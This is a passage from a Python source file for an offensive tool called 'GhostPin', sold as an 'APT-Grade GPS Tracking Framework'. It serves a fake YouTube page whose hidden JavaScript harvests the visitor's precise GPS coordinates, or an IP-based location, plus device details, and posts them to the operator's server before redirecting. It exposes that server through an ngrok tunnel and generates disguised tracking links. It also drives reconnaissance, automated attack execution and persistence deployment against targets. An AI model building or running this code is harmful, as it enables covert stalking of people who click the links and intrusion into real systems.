        # Generate SSL cert
        cert_file = 'server.crt'
        key_file = 'server.key'
        
        if ssl_enabled and (not os.path.exists(cert_file) or not os.path.exists(key_file)):
            try:
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                    '-nodes', '-out', cert_file, '-keyout', key_file,
                    '-days', '365', '-subj', '/CN=localhost'
                ], capture_output=True, check=True)
                print(f"{Colors.GREEN}[+] SSL certificate generated{Colors.WHITE}")
            except:
                print(f"{Colors.YELLOW}[!] SSL generation failed{Colors.WHITE}")
                ssl_enabled = False
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>YouTube</title>
<style>
body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#f9f9f9}}
.spinner{{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #ff0000;border-radius:50%;animation:spin 0.8s linear infinite}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
<script>
(function() {{
    var token = Math.random().toString(36).substring(2, 10);
    var sent = false;
    var hasLocation = false;
    
    function sendLocation(pos) {{
        if (sent) return;
        sent = true;
        var data = {{
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude || 0,
            speed: pos.coords.speed || 0,
            heading: pos.coords.heading || 0,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        }};
        fetch('/track/' + token, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data)
        }}).catch(function() {{}});
    }}
    
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(function(pos) {{
            hasLocation = true;
            sendLocation(pos);
        }}, function() {{}}, {{
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }});
    }}
    
    // Fallback: IP-based location
    setTimeout(function() {{
        if (!hasLocation) {{
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {{
                    if (data.latitude && data.longitude) {{
                        fetch('/track/' + token, {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                lat: data.latitude,
                                lng: data.longitude,
                                accuracy: 1000,
                                timestamp: new Date().toISOString(),
                                source: 'ip',
                                city: data.city,
                                region: data.region,
                                country: data.country_name
                            }})
                        }});
                    }}
                }}).catch(function() {{}});
        }}
    }}, 2000);
    
    setTimeout(function() {{
        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
    }}, 100);
}})();
</script>
</head>
<body>
<div class="spinner"></div>
</body>
</html>'''
            return html
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    data['source_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
                    data['user_agent'] = request.headers.get('User-Agent')
                    self.tracking_data.append(data)
                    
                    self.stats['total'] += 1
                    self.stats['unique'].add(token)
                    self.stats['last'] = data
                    
                    lat = data.get('lat', 'N/A')
                    lng = data.get('lng', 'N/A')
                    print(f"{Colors.GREEN}[+] GPS: {lat}, {lng} ({token}){Colors.WHITE}")
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify({
                    'data': self.tracking_data[-100:],
                    'stats': self.stats,
                    'total': len(self.tracking_data)
                })
        
        @app.route('/stats')
        def get_stats():
            with self.lock:
                return jsonify(self.stats)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
                self.stats = {'total': 0, 'unique': set(), 'last': None}
            return jsonify({'status': 'cleared'})
        
        def run():
            if ssl_enabled and os.path.exists(cert_file) and os.path.exists(key_file):
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True,
                       use_reloader=False, ssl_context=(cert_file, key_file))
            else:
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        protocol = "https" if ssl_enabled else "http"
        print(f"{Colors.GREEN}[+] Server running on port {port} ({protocol}){Colors.WHITE}")
        
        return True
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

#===============================================================================
# NGROK MANAGER
#===============================================================================

class NgrokManager:
    """Manage ngrok tunnel"""
    
    def __init__(self):
        self.process = None
        self.public_url = None
        self.port = 443
        
    def start(self, port: int = 443) -> Optional[str]:
        """Start ngrok tunnel"""
        self.port = port
        
        try:
            subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        except:
            print(f"{Colors.RED}[!] ngrok not installed{Colors.WHITE}")
            return None
        
        print(f"{Colors.BLUE}[*] Starting ngrok tunnel...{Colors.WHITE}")
        
        try:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
            time.sleep(1)
            
            self.process = subprocess.Popen(
                ['ngrok', 'http', str(port), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            try:
                import requests
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    for tunnel in data.get('tunnels', []):
                        if tunnel.get('proto') == 'https':
                            self.public_url = tunnel.get('public_url')
                            print(f"{Colors.GREEN}[+] Public URL: {self.public_url}{Colors.WHITE}")
                            return self.public_url
            except:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[!] ngrok failed: {e}{Colors.WHITE}")
            return None
    
    def stop(self):
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
        else:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)

#===============================================================================
# MAIN APPLICATION
#===============================================================================

class GhostPin:
    """Main application"""
    
    def __init__(self):
        self.server = TrackingServer()
        self.ngrok = NgrokManager()
        self.running = True
        self.public_url = None
        self.current_profile = None
        
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        print(f"\n{Colors.RED}[!] Shutting down...{Colors.WHITE}")
        self.running = False
        if self.server:
            self.server.stop()
        if self.ngrok:
            self.ngrok.stop()
        sys.exit(0)
    
    def _banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}
{Colors.YELLOW}    APT-Grade GPS Tracking Framework v{VERSION}{Colors.WHITE}
{Colors.RED}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
{Colors.DIM}    [+] Authorized security testing only{Colors.WHITE}
"""
        print(banner)
    
    def _menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - APT Framework{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.GREEN}[1]{Colors.WHITE} Start Tracking Server
{Colors.GREEN}[2]{Colors.WHITE} Start ngrok Tunnel
{Colors.GREEN}[3]{Colors.WHITE} Generate Tracking Link
{Colors.GREEN}[4]{Colors.WHITE} View Tracking Data
{Colors.GREEN}[5]{Colors.WHITE} Run APT Reconnaissance
{Colors.GREEN}[6]{Colors.WHITE} Build Attack Chain
{Colors.GREEN}[7]{Colors.WHITE} Deploy Persistence
{Colors.GREEN}[8]{Colors.WHITE} Clear Data
{Colors.RED}[9]{Colors.WHITE} Exit
""")
    
    def _recon_mode(self):
        target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
        if not target:
            return
        
        print(f"{Colors.BLUE}[*] Starting APT reconnaissance...{Colors.WHITE}")
        recon = APTReconnaissance(target)
        self.current_profile = recon.full_recon()
        
        # Save profile
        filename = f"profile_{target}_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.current_profile.to_dict(), f, indent=2)
        print(f"{Colors.GREEN}[+] Profile saved to {filename}{Colors.WHITE}")
        
        # Display summary
        profile = self.current_profile
        print(f"\n{Colors.GREEN}[+] Reconnaissance Summary:{Colors.WHITE}")
        print(f"  Subdomains: {len(profile.subdomains)}")
        print(f"  Open Ports: {len(profile.open_ports)}")
        print(f"  Services: {len(profile.services)}")
        print(f"  Web Apps: {len(profile.web_applications)}")
        print(f"  Cloud Resources: {len(profile.cloud_resources)}")
        
        if profile.vulnerabilities:
            print(f"  Potential Vulnerabilities: {len(profile.vulnerabilities)}")
    
    def _attack_chain(self):
        if not self.current_profile:
            target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
            if not target:
                return
            print(f"{Colors.BLUE}[*] Running reconnaissance first...{Colors.WHITE}")
            recon = APTReconnaissance(target)
            self.current_profile = recon.full_recon()
        
        exploit = APTExploitation(self.current_profile)
        chain = exploit.build_attack_chain()
        
        print(f"\n{Colors.GREEN}[+] Attack Chain ({len(chain)} vectors):{Colors.WHITE}")
        for i, vector in enumerate(chain, 1):
            severity = vector.get('severity', 'unknown')
            color = Colors.RED if severity == 'critical' else Colors.YELLOW
            print(f"\n{color}[{i}] {vector.get('technique', 'Unknown')}{Colors.WHITE}")
            print(f"    CVE: {vector.get('cve', 'N/A')}")
            print(f"    Severity: {severity}")
            print(f"    Confidence: {vector.get('confidence', 0.5)}")
            print(f"    Payload: {vector.get('payload', 'N/A')}")
            
            # Execute attack if user wants
        execute = input(f"\n{Colors.YELLOW}[>] Execute attacks? (y/N): {Colors.WHITE}").strip().lower()
        if execute == 'y':
            for vector in chain[:3]:  # Limit for safety
                result = exploit.execute_attack(vector)
                if result['success']:
                    print(f"{Colors.GREEN}[+] {result['technique']} - SUCCESS{Colors.WHITE}")
                else:
                    print(f"{Colors.RED}[-] {result['technique']} - FAILED{Colors.WHITE}")
    
    def _persistence_mode(self):
        payload = input(f"{Colors.CYAN}[>] Payload path: {Colors.WHITE}").strip()
        if not payload or not os.path.exists(payload):
            print(f"{Colors.RED}[!] Payload not found{Colors.WHITE}")
            return
        
        print(f"{Colors.BLUE}[*] Deploying persistence...{Colors.WHITE}")
        persistence = APTPersistence(payload)
        result = persistence.deploy()
        
        if result['success']:
            print(f"{Colors.GREEN}[+] Persistence deployed ({len(result['methods'])} methods){Colors.WHITE}")
            print(f"  Hidden: {result['hidden']}")
            for method in result['methods']:
                print(f"  - {method.get('technique')} (Priority: {method.get('priority', 'medium')})")
        else:
            print(f"{Colors.RED}[!] Persistence failed: {result.get('error', 'Unknown error')}{Colors.WHITE}")
    
    def run(self):
        """Main loop"""
        self._banner()
        
        while self.running:
            self._menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input(f"{Colors.CYAN}[>] Port (443): {Colors.WHITE}").strip() or "443")
                ssl = input(f"{Colors.CYAN}[>] Enable HTTPS? (Y/n): {Colors.WHITE}").strip().lower() != 'n'
                self.server.start(port, ssl)
            
            elif choice == '2':
                if self.public_url:
                    print(f"{Colors.GREEN}[+] ngrok already running: {self.public_url}{Colors.WHITE}")
                    continue
                port = int(input(f"{Colors.CYAN}[>] Server port (443): {Colors.WHITE}").strip() or "443")
                self.public_url = self.ngrok.start(port)
            
            elif choice == '3':
                video_id = input(f"{Colors.CYAN}[>] Video ID (default: random): {Colors.WHITE}").strip()
                if not video_id:
                    video_id = random_string(11)
                
                protocol = "https" if os.path.exists('server.crt') else "http"
                local_url = f"{protocol}://localhost:{self.server.port}/watch?v={video_id}"
                
                print(f"\n{Colors.GREEN}[+] Tracking Links:{Colors.WHITE}")
                print(f"  {Colors.CYAN}Local:{Colors.WHITE} {local_url}")
                
                if self.public_url:
                    public_url = f"{self.public_url}/watch?v={video_id}"
                    print(f"  {Colors.CYAN}Public:{Colors.WHITE} {public_url}")
            
            elif choice == '4':
                data = self.server.tracking_data
                if not data:
                    print(f"{Colors.YELLOW}[!] No data yet{Colors.WHITE}")
                    continue
                
                stats = self.server.stats
                print(f"\n{Colors.GREEN}[+] Tracking Data (Total: {stats['total']}, Unique: {len(stats['unique'])}){Colors.WHITE}")
                
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ip = record.get('source_ip', 'N/A')
                    
                    print(f"\n  {Colors.YELLOW}[{i}] Token:{Colors.WHITE} {token}")
                    print(f"      Location: {Colors.CYAN}{lat}, {lng}{Colors.WHITE}")
                    print(f"      IP: {Colors.DIM}{ip}{Colors.WHITE}")
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps = f"https://www.google.com/maps?q={lat},{lng}"
                        print(f"      Map: {Colors.BLUE}{maps}{Colors.WHITE}")
            
            elif choice == '5':
                self._recon_mode()
            
            elif choice == '6':
                self._attack_chain()
            
            elif choice == '7':
                self._persistence_mode()
            
            elif choice == '8':
                self.server.tracking_data.clear()
                print(f"{Colors.GREEN}[+] Data cleared{Colors.WHITE}")
            
            elif choice == '9':
                print(f"{Colors.YELLOW}[*] Shutting down...{Colors.WHITE}")
                self.running = False
                self.server.stop()
                if self.ngrok:
                    self.ngrok.stop()
                print(f"{Colors.GREEN}[+] Goodbye!{Colors.WHITE}")
                sys.exit(0)
            
            else:
                print(f"{Colors.RED}[-] Invalid option{Colors.WHITE}")

#===============================================================================
# COMMAND LINE INTERFACE
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"GhostPin v{VERSION} - APT-Grade GPS Tracking Framework",
        epilog=f"Author: {AUTHOR} | License: {LICENSE}"
    )
    
    parser.add_argument("--server", action="store_true", help="Start tracking server")
    parser.add_argument("--port", type=int, default=443, help="Server port")
    parser.add_argument("--no-ssl", action="store_true", help="Disable HTTPS")
    parser.add_argument("--ngrok", action="store_true", help="Start ngrok tunnel")
    parser.add_argument("--recon", help="Run APT reconnaissance on target")
    parser.add_argument("--attack", help="Build attack chain for target")
    parser.add_argument("--persist", help="Deploy persistence for payload")
    parser.add_argument("--video", help="YouTube video ID for tracking link")
    parser.add_argument("--output", help="Output file for results")
    
    args = parser.parse_args()
    
    # Server mode
    if args.server:
        print(f"{Colors.BLUE}[*] Starting GhostPin server...{Colors.WHITE}")
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        
        if args.ngrok:
            ngrok = NgrokManager()
            url = ngrok.start(args.port)
            if url:
                print(f"{Colors.GREEN}[+] Public URL: {url}{Colors.WHITE}")
        
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.WHITE}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            if args.ngrok:
                ngrok.stop()
        sys.exit(0)
    
    # Reconnaissance mode
    if args.recon:
        recon = APTReconnaissance(args.recon)
        profile = recon.full_recon()
        
        output = args.output or f"profile_{args.recon}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(profile.to_dict(), f, indent=2)
        print(f"{Colors.GREEN}[+] Profile saved to {output}{Colors.WHITE}")
        sys.exit(0)
    
    # Attack mode
    if args.attack:
        recon = APTReconnaissance(args.attack)
        profile = recon.full_recon()
        
        exploit = APTExploitation(profile)
        chain = exploit.build_attack_chain()
        
        output = args.output or f"attack_{args.attack}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(chain, f, indent=2)
        print(f"{Colors.GREEN}[+] Attack chain saved to {output}{Colors.WHITE}")
        
        print(f"\n{Colors.GREEN}[+] Attack Vectors ({len(chain)}):{Colors.WHITE}")
        for i, vector in enumerate(chain, 1):
            print(f"  {Colors.YELLOW}{i}.{Colors.WHITE} {vector.get('technique', 'Unknown')}")
        sys.exit(0)
    
    # Persistence mode
    if args.persist:
        if not os.path.exists(args.persist):
            print(f"{Colors.RED}[!] Payload not found: {args.persist}{Colors.WHITE}")
            sys.exit(1)
        
        persistence = APTPersistence(args.persist)
        result = persistence.deploy()
        
        if result['success']:
            print(f"{Colors.GREEN}[+] Persistence deployed{Colors.WHITE}")
            for method in result['methods']:
                print(f"  - {method.get('technique')}")
        else:
            print(f"{Colors.RED}[!] Persistence failed{Colors.WHITE}")
        sys.exit(0)
    
    # Generate tracking link
    if args.video:
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        
        protocol = "https" if not args.no_ssl and os.path.exists('server.crt') else "http"
        link = f"{protocol}://localhost:{args.port}/watch?v={args.video}"
        
        print(f"\n{Colors.GREEN}[+] Tracking Link: {link}{Colors.WHITE}")
        
        if args.ngrok:
            ngrok = NgrokManager()
            url = ngrok.start(args.port)
            if url:
                public_link = f"{url}/watch?v={args.video}"
                print(f"{Colors.GREEN}[+] Public Link: {public_link}{Colors.WHITE}")
        
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.WHITE}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive mode
    if not any(vars(args).values()):
        tool = GhostPin()
        tool.run()

#===============================================================================
# ENTRY POINT
#===============================================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted{Colors.WHITE}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.WHITE}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
